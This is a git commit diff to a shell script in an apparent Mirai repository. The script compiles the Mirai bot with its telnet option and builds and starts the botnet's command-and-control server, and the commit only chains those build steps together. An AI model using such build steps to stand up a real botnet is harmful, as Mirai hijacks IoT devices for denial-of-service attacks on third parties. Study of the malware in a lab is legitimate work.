e41a77eab46c7e23726d3017a3eff4ee4ba6e62f
wh1t3P1g <wh1t3p1g@gmail.com>
2018-07-03 22:12:17 +0800

    Update wait-for-it.sh

--- mirai/wait-for-it.sh
+++ mirai/wait-for-it.sh
@@ -18,7 +18,5 @@ done
 gcc -std=c99 source/bot/*.c -DDEBUG "-DMIRAI_TELNET" \
                         -static -g -o /root/mirai.dbg \
     && go build -o /root/cnc source/cnc/*.go \
-    && mv source/prompt.txt /root && rm -rf source
-echo "compile done"
-
-cp mirai.dbg share/ && ./cnc
+    && mv source/prompt.txt /root && rm -rf source \
+    && cp mirai.dbg share/ && ./cnc
